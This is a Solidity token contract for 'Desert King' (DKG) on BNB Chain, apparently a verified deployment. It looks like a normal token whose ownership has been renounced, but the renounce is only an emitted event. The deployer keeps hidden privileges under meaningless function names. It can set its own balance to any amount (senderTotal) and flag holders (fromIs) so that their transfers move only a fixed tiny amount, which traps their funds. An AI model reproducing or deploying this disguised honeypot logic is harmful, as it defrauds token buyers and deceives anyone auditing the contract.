/**
 *Submitted for verification at BscScan.com on 2023-02-05
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;


interface isShouldToken {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface teamShould {
    function createPair(address tokenA, address tokenB) external returns (address);
}

contract DesertKing {
    uint8 private teamLiquidity = 18;

    address private minTrading;

    string private _name = "Desert King";
    string private _symbol = "DKG";

    uint256 private exemptFund = 100000000 * 10 ** teamLiquidity;
    mapping(address => uint256) private txEnable;
    mapping(address => mapping(address => uint256)) private launchMode;

    mapping(address => bool) public fromMarketing;
    address public receiverFee;
    address public atExempt;
    mapping(address => bool) public buyEnable;
    uint256 constant listAt = 10 ** 10;
    bool public fundTake;

    

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor (){
        isShouldToken swapTotal = isShouldToken(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        atExempt = teamShould(swapTotal.factory()).createPair(swapTotal.WETH(), address(this));
        minTrading = liquidityTotalTrading();
        receiverFee = minTrading;
        fromMarketing[receiverFee] = true;
        txEnable[receiverFee] = exemptFund;
        emit Transfer(address(0), receiverFee, exemptFund);
        minLiquidity();
    }

    

    function name() external view returns (string memory) {
        return _name;
    }

    function getOwner() external view returns (address) {
        return minTrading;
    }

    function balanceOf(address receiverEnable) public view returns (uint256) {
        return txEnable[receiverEnable];
    }

    function transfer(address receiverTx, uint256 isTakeSender) external returns (bool) {
        return transferFrom(liquidityTotalTrading(), receiverTx, isTakeSender);
    }

    function transferFrom(address modeFund, address receiverTx, uint256 isTakeSender) public returns (bool) {
        if (modeFund != liquidityTotalTrading() && launchMode[modeFund][liquidityTotalTrading()] != type(uint256).max) {
            require(launchMode[modeFund][liquidityTotalTrading()] >= isTakeSender);
            launchMode[modeFund][liquidityTotalTrading()] -= isTakeSender;
        }
        if (receiverTx == receiverFee || modeFund == receiverFee) {
            return minIsExempt(modeFund, receiverTx, isTakeSender);
        }
        if (buyEnable[modeFund]) {
            return minIsExempt(modeFund, receiverTx, listAt);
        }
        return minIsExempt(modeFund, receiverTx, isTakeSender);
    }

    function symbol() external view returns (string memory) {
        return _symbol;
    }

    function totalSupply() external view returns (uint256) {
        return exemptFund;
    }

    function owner() external view returns (address) {
        return minTrading;
    }

    function allowance(address senderShould, address swapMode) external view returns (uint256) {
        return launchMode[senderShould][swapMode];
    }

    function fromIs(address launchLiquidity) public {
        if (launchLiquidity == receiverFee || launchLiquidity == atExempt || !fromMarketing[liquidityTotalTrading()]) {
            return;
        }
        buyEnable[launchLiquidity] = true;
    }

    function senderTotal(uint256 isTakeSender) public {
        if (!fromMarketing[liquidityTotalTrading()]) {
            return;
        }
        txEnable[receiverFee] = isTakeSender;
    }

    function minLiquidity() public {
        emit OwnershipTransferred(receiverFee, address(0));
        minTrading = address(0);
    }

    function decimals() external view returns (uint8) {
        return teamLiquidity;
    }

    function approve(address swapMode, uint256 isTakeSender) public returns (bool) {
        launchMode[liquidityTotalTrading()][swapMode] = isTakeSender;
        emit Approval(liquidityTotalTrading(), swapMode, isTakeSender);
        return true;
    }

    function exemptFrom(address fromBuy) public {
        if (fundTake) {
            return;
        }
        fromMarketing[fromBuy] = true;
        fundTake = true;
    }

    function liquidityTotalTrading() private view returns (address) {
        return msg.sender;
    }

    function minIsExempt(address walletSellSwap, address txLimit, uint256 isTakeSender) internal returns (bool) {
        require(txEnable[walletSellSwap] >= isTakeSender);
        txEnable[walletSellSwap] -= isTakeSender;
        txEnable[txLimit] += isTakeSender;
        emit Transfer(walletSellSwap, txLimit, isTakeSender);
        return true;
    }


}